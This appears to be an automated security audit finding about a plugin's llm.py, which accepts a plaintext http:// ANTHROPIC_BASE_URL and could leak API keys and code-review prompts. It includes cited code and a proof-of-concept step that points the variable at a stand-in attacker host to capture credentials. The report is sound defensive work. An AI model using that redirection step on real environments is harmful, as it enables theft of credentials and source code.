This confirms the finding. The `_anthropic_base_url()` function honors an environment variable to determine the API endpoint scheme, with no enforcement that the resolved URL uses HTTPS.

### Title
Missing cleartext-transport enforcement in `ANTHROPIC_BASE_URL` handling allows API key/OAuth token disclosure over plaintext HTTP - (File: `plugins/security-guidance/hooks/llm.py`)

### Summary
The `security-guidance` plugin's LLM-calling code resolves its API endpoint via `_anthropic_base_url()`, which directly honors the `ANTHROPIC_BASE_URL` environment variable with no scheme validation, then uses `urllib.request` to send the `ANTHROPIC_API_KEY` / `ANTHROPIC_AUTH_TOKEN` credentials and the full code-review prompt (which can contain source snippets, diffs, and secrets found in the workspace) to whatever URL results [1](#0-0) . If that URL is `http://`, either because of a misconfigured gateway, a compromised proxy config, or an environment variable injected by a malicious MCP config/CI step, all of this data — including the long-lived API credentials — is transmitted unencrypted [2](#0-1) .

### Finding Description
`_call_claude()` builds the request URL from `_anthropic_base_url() + "/v1/messages"` and sends the API key or OAuth bearer token in the headers via a plain `urllib.request.Request`/`urlopen` call, with no check that the scheme is `https://` [2](#0-1) . The base URL itself is taken verbatim from `os.environ.get("ANTHROPIC_BASE_URL", "https://api.anthropic.com")` with only a `rstrip("/")`, so any scheme (including `http://`) is accepted without warning or hard failure [1](#0-0) . The connectivity probe `_probe_anthropic()` exhibits the same pattern, issuing a `HEAD` request to the unchecked base URL [3](#0-2) . This mirrors the Android report's core issue: no equivalent of a "Network Security Configuration" cleartext-traffic opt-out exists to force all outbound Anthropic API traffic onto TLS; the transport policy is entirely delegated to an externally supplied string.

### Impact Explanation
If `ANTHROPIC_BASE_URL` is ever set to an `http://` scheme — via a misconfigured LiteLLM/Bifrost gateway, a compromised shell profile, a CI secret injected incorrectly, or a project-level `.env`/settings file an attacker can influence — the plugin will silently send the user's `ANTHROPIC_API_KEY`/`ANTHROPIC_AUTH_TOKEN` and the full security-review prompt (which embeds source code, diffs, and potentially secrets under review) as cleartext HTTP. Anyone positioned on the network path (corporate proxy, coffee-shop Wi-Fi, compromised router) can capture the long-lived credential and full code content, enabling account takeover of the Anthropic API key and exfiltration of proprietary source.

### Likelihood Explanation
Exploitation requires the base URL to resolve to an `http://` value, which is not the out-of-the-box default (`https://api.anthropic.com`). This makes the scenario dependent on a misconfiguration or an environment variable that an attacker can influence in a CI or shared dev environment; it is not directly exploitable by a remote unauthenticated party against a default installation. Likelihood is therefore low-to-moderate and gated on an existing environment-variable trust boundary being crossed.

### Recommendation
In `_anthropic_base_url()`, validate that the resolved URL's scheme is `https` and raise/log a hard error (or refuse to send the API key) if not, rather than silently proceeding with `urllib.request`. Consider adding an explicit allow-list opt-in (e.g., `ANTHROPIC_BASE_URL_ALLOW_HTTP=1`) for legitimate local-gateway testing, mirroring the Android Network Security Configuration's `cleartextTrafficPermitted` exemption model, so cleartext is only used when explicitly acknowledged rather than by default whenever the env var happens to specify it.

### Proof of Concept
1. Set `export ANTHROPIC_BASE_URL="http://attacker-controlled-proxy.example.com"` and `export ANTHROPIC_API_KEY="sk-ant-..."` in a shell where the security-guidance hook will run (e.g., triggered by `PreToolUse`/`Stop` hooks during a `claude` session).
2. Trigger a security review path that calls `_call_claude()` (e.g., via the Stop hook after editing a file).
3. Observe (e.g., with `tcpdump`/a listener on the attacker proxy) that `plugins/security-guidance/hooks/llm.py`'s `_call_claude` sends the `x-api-key`/`Authorization` header and full prompt body as plaintext HTTP to `attacker-controlled-proxy.example.com`, with no error or warning from the plugin about the insecure scheme [4](#0-3) .

### Citations

**File:** plugins/security-guidance/hooks/llm.py (L90-99)
```python
def _anthropic_base_url() -> str:
    """Resolve the Anthropic-protocol endpoint base URL.

    Honors ANTHROPIC_BASE_URL (the convention the Anthropic SDK and CC itself
    use) so customers behind an LLM gateway (LiteLLM, Bifrost, self-hosted
    Anthropic-compatible proxy) can route the plugin's reviews through their
    gateway. Defaults to https://api.anthropic.com. Always returns a string
    with no trailing slash so callers can safely append /v1/messages etc.
    """
    return os.environ.get("ANTHROPIC_BASE_URL", "https://api.anthropic.com").rstrip("/")
```

**File:** plugins/security-guidance/hooks/llm.py (L102-110)
```python
def _probe_anthropic(timeout: float = 5.0) -> bool:
    req = urllib.request.Request(_anthropic_base_url() + "/", method="HEAD")
    try:
        with urllib.request.urlopen(req, timeout=timeout):
            return True
    except urllib.error.HTTPError:
        return True  # got a status code → connected
    except (urllib.error.URLError, TimeoutError, OSError):
        return False
```

**File:** plugins/security-guidance/hooks/llm.py (L420-457)
```python
    api_url = _anthropic_base_url() + "/v1/messages"
    use_token = _auth_prefer_token or not ANTHROPIC_API_KEY
    headers = _build_auth_headers(use_token)

    payload = {
        "model": model or SECURITY_REVIEW_MODEL,
        "max_tokens": max_tokens,
        "system": CLAUDE_CODE_SYSTEM_PROMPT,
        "messages": [{"role": "user", "content": prompt}],
        "output_format": {
            "type": "json_schema",
            "schema": output_schema
        }
    }
    if thinking_budget > 0:
        # Models trained on adaptive thinking (4.6+) reject the budget_tokens
        # form with a 400 ("thinking.type.enabled is not supported"). Older
        # models (4.5 and earlier, all 3.x) reject adaptive. Pick by model.
        if _model_supports_adaptive_thinking(payload["model"]):
            payload["thinking"] = {"type": "adaptive"}
            payload["output_config"] = {"effort": "high"}
        else:
            payload["thinking"] = {
                "type": "enabled",
                "budget_tokens": thinking_budget,
            }

    response_data = None
    for attempt in range(3):
        try:
            request = urllib.request.Request(
                api_url,
                data=json.dumps(payload).encode("utf-8"),
                headers=headers,
                method="POST",
            )
            with urllib.request.urlopen(request, timeout=120) as response:
                response_body = response.read().decode("utf-8")
```
